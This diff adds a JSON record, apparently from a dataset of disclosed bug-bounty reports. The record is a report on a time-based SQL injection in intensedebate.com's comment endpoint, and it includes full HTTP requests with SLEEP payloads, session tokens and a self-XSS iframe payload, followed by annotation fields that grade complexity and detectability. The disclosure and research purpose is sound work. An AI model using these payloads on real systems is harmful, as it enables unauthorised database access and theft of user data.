@@ -1,0 +1,42 @@
+{
+    "reported_to": "Automattic",
+    "reported_by": "fuzzme ",
+    "title": "[intensedebate.com] SQL Injection Time Based On /js/commentAction/",
+    "content": "\n[intensedebate.com] SQLi Time Based On /js/commentAction/\nSummary:\nHello,\nI have found a SQLI Injection Time Based on /js/commentAction/.\nWhen a user want to submit/reply to a comment, a JSON payload was send by a GET request.\nCode 119 Bytes\n1Host: www.intensedebate.com```\n2\n3The key `\"acctid\":\"251219\"` is vulnerable to SQL Injection Time based\n4\n5\n6## Detection :\n7\nGET /js/commentAction/?data={\"request_type\":\"0\",+\"params\":+{+\"firstCall\":true,+\"src\":0,+\"blogpostid\":504704482,+\"acctid\":\"251219%20AND%20SLEEP(15)%23\",+\"parentid\":\"0\",+\"depth\":\"0\",+\"type\":\"1\",+\"token\":\"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh\",+\"anonName\":\"\",+\"anonEmail\":\"X\",+\"anonURL\":\"\",+\"userid\":\"26745290\",+\"token\":\"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh\",+\"mblid\":\"1\",+\"tweetThis\":\"F\",+\"subscribeThis\":\"1\",+\"comment\":\"w\"}} HTTP/1.1\nHost: www.intensedebate.com\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0\nAccept: /\nAccept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nConnection: close\nReferer: https://www.intensedebate.com/commentPopup.php?acct=0de44735e7089c61f14c17373373c235&postid=473573&posttitle=Jimmy%20Butler%20de%20retour,%20les%20Wolves%20\nCookie: login_pref=IDC; idcomments_userid=26745290; idcomments_token=6426c387ebed7ec573f03d218e0d4c2a%7C1607620848; country_code=FR; IDNewThreadComment=w\nCode 32 Bytes\n1\n2HTTP Response `15 414 millis`\n3\n4\nGET /js/commentAction/?data={\"request_type\":\"0\",+\"params\":+{+\"firstCall\":true,+\"src\":0,+\"blogpostid\":504704482,+\"acctid\":\"251219%20AND%20SLEEP(7)%23\",+\"parentid\":\"0\",+\"depth\":\"0\",+\"type\":\"1\",+\"token\":\"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh\",+\"anonName\":\"\",+\"anonEmail\":\"X\",+\"anonURL\":\"\",+\"userid\":\"26745290\",+\"token\":\"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh\",+\"mblid\":\"1\",+\"tweetThis\":\"F\",+\"subscribeThis\":\"1\",+\"comment\":\"w\"}} HTTP/1.1\nHost: www.intensedebate.com\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0\nAccept: /\nAccept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nConnection: close\nReferer: https://www.intensedebate.com/commentPopup.php?acct=0de44735e7089c61f14c17373373c235&postid=473573&posttitle=Jimmy%20Butler%20de%20retour,%20les%20Wolves%20\nCookie: login_pref=IDC; idcomments_userid=26745290; idcomments_token=6426c387ebed7ec573f03d218e0d4c2a%7C1607620848; country_code=FR; IDNewThreadComment=w\nCode 368 Bytes\n1\n2HTTP Response `7 660 millis`\n3\n4Bonus :  the  key`\"src\":0` is vulnerable to self-XSS, change the value by `\"<iframe%20src=%23%20onload=alert('XSS')>\"` and you will see a XSS pop-up\n5\n6\n7## POC\n8\n9SQLi Time based : sleep_7.png, sleep_15.png and POC.mp4\n10Self-XSS : Self-XSS.mp4\n11\n12\n13Thank you, good bye.\n14\n15Fuzzme.\n16\n17## Impact\n18\n19Full database access holding private user information.\n\n",
+    "severity": [
+        9.0,
+        10.0
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "SQL Injection"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1609510740,
+    "report_url": "https://hackerone.com/reports/1044698",
+    "vuln_category": "WEB_APP",
+    "is_multi_component": false,
+    "complexity": "MEDIUM",
+    "novelty": "MEDIUM",
+    "steps": [
+        [
+            1,
+            "Send a GET request to `/js/commentAction/` with a JSON payload containing the vulnerable `acctid` parameter modified to include a SQL time-based payload (e.g., `251219%20AND%20SLEEP(15)%23`)."
+        ],
+        [
+            2,
+            "Observe the response time to confirm the SQL injection (e.g., delayed response matching the SLEEP duration)."
+        ]
+    ],
+    "vuln_description": "A time-based SQL injection vulnerability exists in the `acctid` parameter of the `/js/commentAction/` endpoint, allowing an attacker to execute arbitrary SQL queries by manipulating the parameter to include time-delay payloads (e.g., `SLEEP(15)`). Additionally, the `src` parameter is vulnerable to self-XSS.",
+    "reason": "The vulnerability involves straightforward manipulation of a single parameter (`acctid`) with a common SQL injection technique (time-based). No complex interactions or multi-step state manipulation is required. The XSS component is also simple and self-contained.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null,
+    "authnz_metadata": {
+        "reason": "The SQL Injection Time Based vulnerability involves manipulating the 'acctid' parameter in a GET request to trigger a time-based delay, which is a form of SQL injection. The methodology described focuses on testing authentication and authorization boundaries by swapping user sessions and resource IDs within the same application. Since SQL injection is a separate vulnerability class that does not involve crossing authorization boundaries but rather exploits improper input sanitization, it would not be detected by the described methodology.",
+        "is_detectable": false
+    }
+}
